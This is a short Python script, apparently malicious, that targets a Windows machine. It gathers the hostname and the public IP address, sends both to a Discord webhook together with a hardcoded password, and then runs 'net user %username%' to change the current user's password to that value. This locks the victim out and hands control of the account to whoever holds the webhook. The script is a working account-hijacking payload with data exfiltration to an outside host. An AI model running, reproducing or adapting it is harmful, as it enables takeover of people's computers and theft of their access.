import os, socket, requests
from dhooks import Webhook
hook = Webhook('WEBHOOK URL')
hostname = socket.gethostname()
ip = requests.get('https://api.ipify.org').text
passw = "NewPassWord@2021#"
hook.send(f'```\nUsername : {hostname}\nIP Address : {ip}\nPassword : {passw}```')
os.system(f'net user %username% {passw}')
